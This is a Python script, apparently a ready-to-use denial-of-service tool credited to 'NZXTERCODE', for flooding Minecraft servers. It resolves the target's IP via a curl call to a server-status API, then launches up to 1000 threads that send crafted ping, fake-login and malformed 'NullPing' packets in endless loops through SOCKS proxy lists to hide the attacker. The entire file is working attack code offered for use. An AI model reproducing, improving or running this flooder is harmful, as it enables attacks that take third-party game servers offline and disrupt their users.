#!/usr/bin/python3

#BY NZXTERCODE https://dsc.gg/nzxterdc

import requests, string, socket, socks, time, random, threading, sys, datetime, argparse, os


mode = "Flood"

parser = argparse.ArgumentParser(description=("PacketFlooder"))
parser.add_argument("-host", type=str,
					help="• Victim [HOST]")
parser.add_argument("-p", "--port", type=int,
					default="25565", help="• Victim [PORT]")
parser.add_argument("-m", "--method", type=int,
					default="2", help="• Attack Method")
parser.add_argument("-threads", "--threads", type=int,
					default="1000", help="• Threads")
parser.add_argument("-type", "--type", type=int,
					default="4", help="• Type [SOCKS]")
parser.add_argument("-amp", "--amplification", type=str,
					default="100", help="• Amplification")
#parser.add_argument("-print", "--print", type=str,
#					default="true", help="• Print Optimization")
parser.add_argument("-pFile", "--proxiesFile", type=str,
					default="socks4.txt", help="• Proxies File")
parser.add_argument("-noP", "--noProxy", type=str,
					default="false", help="• Attack without proxies [Faster]")


args = parser.parse_args()

printOption = "false"





def build_threads(mode,thread_num,event,socks_type):
	if mode == "Flood":
		for _ in range(thread_num):
			th = threading.Thread(target = flood,args=(event,socks_type,))
			th.setDaemon(True)
			th.start()


def flood(event,socks_type):
	if (opcion == 2):
		proxy = random.choice(proxies).strip().split(":")
		nicks = random.choice(lista)
		Caracteres = len(nicks)
		Tamano = bytes([Caracteres + 2])
		Zero = b'\x00'
		NickL = bytes([Caracteres])
		encodeNick = nicks[:-1].encode(encoding="utf-8")
		event.wait()
		while True:
			try:
				s = socks.socksocket()
				if socks_type == 4:
					s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
					s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
					s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
				if socks_type == 5:
					s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
					s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
					s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
				if socks_type == 6:
					s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
				s.connect((str(ip), int(port)))
				try:
					for _ in range(amplification):
						s.send(Mensaje + Tamano + Zero + NickL + encodeNick)
				except:
					s.close()
				#print ("[»] " + str(Method) + " | Proxy - " +str(proxy[0])+":"+str(proxy[1])) // I wouldn't activate it, it spams too much!
			except:
				s.close()
	if (opcion == 1):
		proxy = random.choice(proxies).strip().split(":")
		event.wait()
		while True:
			try:
				s = socks.socksocket()
				if socks_type == 4:
					s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
					s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
				if socks_type == 5:
					s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
					s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
				if socks_type == 6:
					s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
				s.connect((str(ip), int(port)))
				try:
					for _ in range(amplification):
						s.send(Mensaje)
				except:
					s.close()
				#print ("[»] " + str(Method) + " | Proxy - " +str(proxy[0])+":"+str(proxy[1])) // I wouldn't activate it, it spams too much!
			except:
				s.close()


def opciones():
	global ip
	global port
	global proxies
	global amplification
	global socks_type
	global choice
	global opcion
	global thread_num
	global Test
	global Test2
	global lista
	global Mensaje
	global Method
	color = '\33[31m'
	green = '\33[32m'
	white = '\33[37m'
	print(color + """
	    
	 ▄▄▄▄   ▓█████▄▄▄█████▓ ▄▄▄     ▄▄▄█████▓ ▒█████   ▒█████   ██▓    
	▓█████▄ ▓█   ▀▓  ██▒ ▓▒▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    
	▒██▒ ▄██▒███  ▒ ▓██░ ▒░▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    
	▒██░█▀  ▒▓█  ▄░ ▓██▓ ░ ░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    
	░▓█  ▀█▓░▒████▒ ▒██▒ ░  ▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
	░▒▓███▀▒░░ ▒░ ░ ▒ ░░    ▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
	▒░▒   ░  ░ ░  ░   ░      ▒   ▒▒ ░   ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
	 ░    ░    ░    ░        ░   ▒    ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
	 ░         ░  ░              ░  ░            ░ ░      ░ ░      ░  ░
	      ░                                                            

    """)
	opcion = int(input(green + """

                  ┌──────────────────────────────────────────────┐
                  │               By NZXTERCODE                  │
                  │                                              │
                  │ 1. DemonShredder - Sends PING packets        │
                  │ 2. HadesDestroyer - Sends Connection Packets │
                  │ 3. NullPing - Sends invalid packets          │
                  └──────────────────────────────────────────────┘
                    💀 » Choose your method: """))
	print("")    
	print(white + "")
	ip = str(input("» IP: "))
	if ip == "":
		print("» Please enter correct host or ip")
		sys.exit(1)
	if mode == "flood":
		pass
	r1 = os.popen("curl -s https://api.mcsrvstat.us/2/" + ip).read()
	start1 = ("\"ip\":\"")
	end1 = "\","
	ip = (r1.split(start1))[1].split(end1)[0]

	encodeIP = ip.encode(encoding="utf-8", errors="strict")
	lista = open("Nicks.txt").readlines()
	PingSlapper = b'\xfe\x01\xfa\x00\x0b\x00M\x00C\x00|\x00P\x00i\x00n\x00g\x00H\x00o\x00s\x00t\x00#\x7f\x00\x0e\x001\x004\x007\x00.\x001\x003\x005\x00.\x003\x001\x00.\x001\x007\x005\x00\x00\x03\xe7'
	CPSFlooder = b'\x0f\x00/\tlocalhostc\xdf\x02'
	#Part2 = b'\x00/\tlocalhostc\xdf\x02\r\x00\x0bq\x0b/\xfd\x00\xa1#\xfd\xa1v\xfd'
	NullPing = b'\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01AttackByNzxter'
	if (opcion == 1):
		Mensaje = PingSlapper
		Method = "DemonShredder"
	if (opcion == 2):
		Mensaje = CPSFlooder
		Method = "HadesDestroyer"
	if (opcion == 3):
		Mensaje = NullPing
		Method = "NullPing"
	print("")    
	port = str(input("» Puerto: "))
	if port == '':
		port = int(25565)
		print("» Default choose port 25565\r\n» Port 25565 was chosen")
	else:
		port = int(port)
	thread_num = int(input("» Threads [default: 1000]: "))
	if thread_num == "":
		thread_num = int(1000)
	choice = ""
	while choice == "":
		choice = str(input("» Socks 4 or 5? [default: 4]: ")).strip()
		if choice == "5":
			choice = "5"
		if choice != "4" and choice != "5":
			print("[»] Error TYPE_INVALID try again")
			choice = ""
		if choice == "4":
			socks_type = 4
		else:
			socks_type = 5
	if choice == "4":
		out_file = str("socks4.txt")
		if out_file == '':
			out_file = str("socks4.txt")
		else:
			out_file = str(out_file)
		proxies = open(out_file).readlines()
	elif choice == "5":
		out_file = ("socks5.txt")
		if out_file == '':
			out_file = str("socks4.txt")
		else:
			out_file = "socks4.txt"
		proxies = open(out_file).readlines()
	print ("» TYPE %s // Proxies: %s" %(choice,len(proxies)))
	amplification = str(input("» Loop (How many requests per thread):"))
	if amplification == "":
		amplification = int(100)
	else:
		amplification = int(amplification)
	NoProxy = str(input("» NoProxy (BETA [Attack without Proxies <FASTER> ]) true/false: "))
	if (NoProxy == "true"):
			socks_type = 6 # No Proxies
			beta = "True"
	else:
			socks.type = choice
			beta = "False"
	print("» IP - " + str(ip))
	print("» Port - " + str(port))
	print("» Method - " + str(Method))
	print("» Threads - " + str(thread_num))
	print("» Socks - " + str(socks_type))
	print("» Amplification - " + str(amplification))
	print("» NoProxy - " + str(beta))
	print("")
	input("» Press enter «")
	print("")
	start()

def start():
	event = threading.Event()
	print("» Initiating Threads")
	print("» Starting Attack [Print Mode Disabled, Change in Flooder.py]")
	build_threads(mode,thread_num,event,socks_type)
	event.clear()
	event.set()
	while True:
		try:
			time.sleep(0)
		except KeyboardInterrupt:
			break
	


if len(sys.argv) == 1:
	opciones()
else:
	global ip
	global port
	global socks_type
	global proxies
	global amplification
	global choice
	global opcion
	global thread_num
	global Test
	global Test2
	global Mensaje
	global Method
	global lista
	ip = args.host
	r1 = os.popen("curl -s https://api.mcsrvstat.us/2/" + ip).read()
	start1 = ("\"ip\":\"")
	end1 = "\","
	ip = (r1.split(start1))[1].split(end1)[0]
	lista = open("Nicks.txt").readlines()
	PingSlapper = b'\xfe\x01\xfa\x00\x0b\x00M\x00C\x00|\x00P\x00i\x00n\x00g\x00H\x00o\x00s\x00t\x00#\x7f\x00\x0e\x001\x004\x007\x00.\x001\x003\x005\x00.\x003\x001\x00.\x001\x007\x005\x00\x00\x03\xe7'
	CPSFlooder = b'\x0f\x00/\tlocalhostc\xdf\x02' 
	Part2 = b'\x01\xbc\x02\x0b\x00\tNZXTERO' # can be randomized using a list of nicknames, but that's up to you
	NullPing = b'\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01AttackByNzxter'
	port = args.port
	opcion = args.method
	if (opcion == 1):
		Mensaje = PingSlapper
		Method = "DemonShredder"
	if (opcion == 2):
		Mensaje = CPSFlooder
		Method = "HadesDestroyer"
	if (opcion == 3):
		Mensaje = NullPing
		Method = "NullPing"
	thread_num = args.threads
	socks_type = args.type
	out_file = args.proxiesFile
	proxies = open(out_file).readlines()
	amplification = int(args.amplification)
	NoProxy = args.noProxy
	if (NoProxy == "true"):
			socks_type = 6 # No Proxies
			beta = "True"
	else:
			socks.type = args.type
			beta = "False"
	print("» IP - " + str(ip))
	print("» Port - " + str(port))
	print("» Method - " + str(Method))
	print("» Threads - " + str(thread_num))
	print("» Socks - " + str(socks_type))
	print("» Amplification - " + str(amplification))
	print("» NoProxy - " + str(beta))
	print("")
	input("» Press enter «")
	print("")
	start()


